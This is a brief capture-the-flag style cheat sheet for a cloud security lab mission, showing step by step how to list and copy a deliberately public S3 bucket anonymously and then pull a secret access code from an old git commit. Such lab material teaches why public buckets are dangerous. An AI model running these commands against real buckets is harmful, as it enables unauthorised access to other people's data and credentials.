# Mission 1 cheat sheet


This mission is mainly used to show that a public bucket is a bad, bad idea.


  * Given: Bucket name
  * Variables: $id


$ `aws --no-sign-request s3 ls s3://evilcorp-evilbucket-$id`

List the bucket to see its contents. The `--no-sign-request` flag serves to list it anonymously.


$ `aws --no-sign-request s3 sync s3://evilcorp-evilbucket-$id ./bucket`

Copy the contents of the bucket in a local folder. Since the bucket is public and its permissions are extra-loose, you can do it anonymously.


$ `cd bucket; git log`

The bucket contains a git folder. The log command serves to check the commits in there.


$ `git checkout <hash of first commit>`

Get the first commit in the git.


$ `cat extremely-evil-access-code.txt`

You win! Decoding the flag is optional.